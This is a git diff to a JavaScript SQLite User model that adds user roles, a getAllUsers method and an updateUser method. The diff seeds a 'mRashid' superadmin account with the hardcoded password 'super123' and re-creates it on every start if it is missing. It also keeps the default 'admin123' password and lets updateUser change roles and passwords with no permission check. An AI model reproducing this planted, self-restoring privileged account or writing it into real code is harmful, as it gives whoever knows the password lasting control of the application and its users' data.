@@ -26,7 +26,8 @@ class User {
                  name TEXT NOT NULL,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                  last_login DATETIME,
-                 is_active BOOLEAN DEFAULT 1
+                 is_active BOOLEAN DEFAULT 1,
+                 role TEXT DEFAULT 'user' CHECK (role IN ('user', 'superadmin'))
             );
         `;
 
@@ -43,11 +44,27 @@ class User {
                     try {
                         const hashedPassword = await bcrypt.hash('admin123', 10);
                         db.run(
-                            'INSERT INTO users (id, username, password_hash, name) VALUES (?, ?, ?, ?)',
-                            [1, 'admin', hashedPassword, 'Admin User'],
+                            'INSERT INTO users (id, username, password_hash, name, role) VALUES (?, ?, ?, ?, ?)',
+                            [1, 'admin', hashedPassword, 'Admin User', 'user'],
                             (err) => {
                                 if (err) console.error('Error creating admin user:', err);
-                                db.close();
+
+                                // Check if mRashid superadmin exists
+                                db.get('SELECT id FROM users WHERE username = ?', ['mRashid'], async (err, superuser) => {
+                                    if (!superuser) {
+                                        const superHashedPassword = await bcrypt.hash('super123', 10);
+                                        db.run(
+                                            'INSERT INTO users (username, password_hash, name, role) VALUES (?, ?, ?, ?)',
+                                            ['mRashid', superHashedPassword, 'Super Admin', 'superadmin'],
+                                            (err) => {
+                                                if (err) console.error('Error creating superadmin user:', err);
+                                                db.close();
+                                            }
+                                        );
+                                    } else {
+                                        db.close();
+                                    }
+                                });
                             }
                         );
                     } catch (error) {
@@ -55,6 +72,19 @@ class User {
                         db.close();
                     }
                 } else {
+                    // Ensure mRashid exists
+                    db.get('SELECT id FROM users WHERE username = ?', ['mRashid'], async (err, superuser) => {
+                        if (!superuser) {
+                            const superHashedPassword = await bcrypt.hash('super123', 10);
+                            db.run(
+                                'INSERT INTO users (username, password_hash, name, role) VALUES (?, ?, ?, ?)',
+                                ['mRashid', superHashedPassword, 'Super Admin', 'superadmin'],
+                                (err) => {
+                                    if (err) console.error('Error creating superadmin user:', err);
+                                }
+                            );
+                        }
+                    });
                     db.close();
                 }
             });
@@ -92,7 +122,8 @@ class User {
                                     resolve({
                                         id: user.id,
                                         username: user.username,
-                                        name: user.name
+                                        name: user.name,
+                                        role: user.role || 'user'
                                     });
                                 }
                             );
@@ -109,7 +140,8 @@ class User {
                                         resolve({
                                             id: user.id,
                                             username: user.username,
-                                            name: user.name
+                                            name: user.name,
+                                            role: user.role || 'user'
                                         });
                                     }
                                 );
@@ -164,7 +196,7 @@ class User {
             const db = new sqlite3.Database(this.dbPath);
 
             db.get(
-                'SELECT id, username, name, created_at, last_login FROM users WHERE id = ? AND is_active = 1',
+                'SELECT id, username, name, role, created_at, last_login FROM users WHERE id = ? AND is_active = 1',
                 [id],
                 (err, user) => {
                     db.close();
@@ -176,6 +208,84 @@ class User {
             );
         });
     }
+
+    async getAllUsers() {
+        return new Promise((resolve, reject) => {
+            const db = new sqlite3.Database(this.dbPath);
+
+            db.all(
+                'SELECT id, username, name, role, created_at, last_login, is_active FROM users ORDER BY created_at DESC',
+                [],
+                (err, users) => {
+                    db.close();
+                    if (err) {
+                        return reject(err);
+                    }
+                    resolve(users);
+                }
+            );
+        });
+    }
+
+    async updateUser(id, updates) {
+        return new Promise(async (resolve, reject) => {
+            try {
+                const db = new sqlite3.Database(this.dbPath);
+                const { name, password, role, is_active } = updates;
+
+                let query = 'UPDATE users SET ';
+                const params = [];
+                const updateFields = [];
+
+                if (name !== undefined) {
+                    updateFields.push('name = ?');
+                    params.push(name);
+                }
+
+                if (password) {
+                    const hashedPassword = await bcrypt.hash(password, 10);
+                    updateFields.push('password_hash = ?');
+                    params.push(hashedPassword);
+                }
+
+                if (role !== undefined) {
+                    updateFields.push('role = ?');
+                    params.push(role);
+                }
+
+                if (is_active !== undefined) {
+                    updateFields.push('is_active = ?');
+                    params.push(is_active ? 1 : 0);
+                }
+
+                if (updateFields.length === 0) {
+                    db.close();
+                    return resolve({ success: false, message: 'No fields to update' });
+                }
+
+                query += updateFields.join(', ') + ' WHERE id = ?';
+                params.push(id);
+
+                db.run(query, params, function(err) {
+                    if (err) {
+                        db.close();
+                        return reject(err);
+                    }
+
+                    if (this.changes === 0) {
+                        db.close();
+                        return resolve({ success: false, message: 'User not found' });
+                    }
+
+                    db.close();
+                    resolve({ success: true, message: 'User updated successfully' });
+                });
+            } catch (error) {
+                reject(error);
+            }
+        });
+    }
+
 }
 
 export default new User();
